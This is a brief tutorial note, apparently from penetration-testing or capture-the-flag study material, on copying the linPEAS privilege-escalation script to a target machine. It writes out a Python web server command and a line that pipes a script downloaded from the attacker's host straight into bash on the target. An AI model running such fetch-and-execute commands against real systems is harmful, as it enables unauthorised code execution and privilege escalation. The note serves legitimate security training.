The first course of action with linPEAS is getting it on to the target machine
Start by opening up a python web server in the directory where linpeas.sh is located
```
python3 -m http.server 80
```
FYI if you don't know where linpeas.sh is check /usr/share/peass/linpeas


then using curl, wget, or something similar, to download linpeas from your machine onto the target machine
```
curl http://192.168.255.255/linpeas.sh | bash
```
